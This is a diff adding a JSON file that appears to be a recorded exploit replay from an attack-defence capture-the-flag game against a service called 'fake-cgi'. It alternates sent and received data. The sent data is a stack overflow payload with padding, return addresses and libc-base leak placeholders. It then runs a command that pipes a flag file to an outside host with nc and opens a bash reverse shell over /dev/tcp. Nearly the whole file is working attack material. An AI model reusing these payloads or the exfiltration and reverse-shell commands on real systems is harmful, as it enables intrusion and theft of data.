@@ -1,0 +1,7 @@
+[
+    "1Who r u?\\n", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcd\\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb\\xa3\\t@\\x00\\x00\\x00\\x00\\x00\\x18\\x10`\\x00\\x00\\x00\\x00\\x00 \\x06@\\x00\\x00\\x00\\x00\\x00\\xb6\\x07@\\x00\\x00\\x00\\x00\\x00\\n", 
+    "1welcome!aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb\\xa3\\t@HTTP/1.1 404 Not Found\\r\\nContent-Type: text/html; charset=UTF-8\\r\\nContent-Length: 23\\r\\nServer: EasyServer (Linux)\\r\\n\\r\\n<h3>Page Not Found</h3>{{{LIBC_BASE:456336:6:ORI:253:0x7f7560fcb690}}}\\nWho r u?\\n", 
+    "0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcd\\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb{{{LIBC_BASE:283158:8:ORI:106:0x7f7560fa1216}}}\\ncat /flags/fake-cgi/flag | nc 10.10.4.108 8100; bash -c \\'bash -i >& /dev/tcp/10.0.4.1/4433 0>&1\\'\\n", 
+    "1welcome!aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb{{{LIBC_BASE:283158:6:ORI:113:0x7f7560fa1216}}}HTTP/1.1 404 Not Found\\r\\nContent-Type: text/html; charset=UTF-8\\r\\nContent-Length: 23\\r\\nServer: EasyServer (Linux)\\r\\n\\r\\n<h3>Page Not Found</h3>"
+]
